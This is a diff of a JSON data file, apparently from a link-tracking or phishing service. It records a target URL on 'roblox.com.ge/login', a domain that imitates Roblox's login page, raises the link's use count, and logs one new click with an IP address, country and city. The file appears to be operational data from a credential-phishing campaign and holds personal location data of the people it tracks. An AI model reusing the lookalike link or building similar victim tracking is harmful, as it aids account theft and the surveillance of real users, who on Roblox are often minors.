@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1208,
+    "useCount": 1209,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9808,6 +9808,14 @@
         "city": "Kuwait City",
         "flag": "🇰🇼",
         "countryCode": "KW"
+      },
+      {
+        "timestamp": 1777311266306,
+        "ip": "122.52.141.243",
+        "country": "Philippines",
+        "city": "Makati City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
